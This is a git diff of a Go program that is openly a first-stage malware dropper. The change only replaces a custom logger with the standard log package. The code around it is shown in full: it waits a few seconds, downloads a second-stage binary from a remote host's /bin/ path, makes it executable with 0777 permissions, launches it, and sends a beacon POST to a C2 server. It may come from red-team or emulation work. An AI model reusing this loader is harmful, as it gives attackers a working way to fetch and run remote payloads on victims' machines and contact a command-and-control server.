@@ -1,6 +1,7 @@
 package main
 
 import (
+	"log"
 	"os"
 	"os/exec"
 	"time"
@@ -14,23 +15,27 @@ func main() {
 	const getUrl = "http://" + host + "/bin/" + filename
 	var body = []byte(`{"stage":"1"}`)
 
-	Log := setupLogger("lw-stage-1.log")
-
+	f := setupLogger("lw-stage-1.log")
+	defer func(f *os.File) {
+		_ = f.Close()
+	}(f)
+	log.SetOutput(f)
+	log.Println("Stage 1 started")
 	// wait a few seconds
 	time.Sleep(3 * time.Second)
 
 	// download second stage file
-	Log.Println("Downloading stage 2...")
+	log.Println("Downloading stage 2...")
 	getErr := httpGet(getUrl, filename)
 	if getErr != nil {
-		Log.Println("Error downloading 2nd stage", getErr)
+		log.Println("Error downloading 2nd stage", getErr)
 		panic(getErr)
 	}
 
 	// make file executable
 	chmodErr := os.Chmod(filename, 0777)
 	if chmodErr != nil {
-		Log.Println("Error changing permissions", chmodErr)
+		log.Println("Error changing permissions", chmodErr)
 		panic(chmodErr)
 	}
 
@@ -44,11 +49,11 @@ func main() {
 	}
 
 	// execute second stage binary
-	Log.Println("Executing stage 2...")
+	log.Println("Executing stage 2...")
 	command := exec.Command(path + "/" + filename)
 	execErr := command.Start()
 	if execErr != nil {
-		Log.Println("Error starting stage 2", execErr)
+		log.Println("Error starting stage 2", execErr)
 		panic(execErr)
 	}
 
@@ -56,12 +61,12 @@ func main() {
 	time.Sleep(3 * time.Second)
 
 	//beacon to C2 once
-	Log.Println("Beaconing to C2 once...")
+	log.Println("Stage 1 beaconing to C2 once...")
 	postErr := httpPost(postUrl, body)
 	if postErr != nil {
-		Log.Println("Error posting beacon to API", postErr)
+		log.Println("Error posting beacon to API", postErr)
 		panic(postErr)
 	}
 
-	Log.Println("Completed. Terminating.")
+	log.Println("Completed. Terminating.")
 }
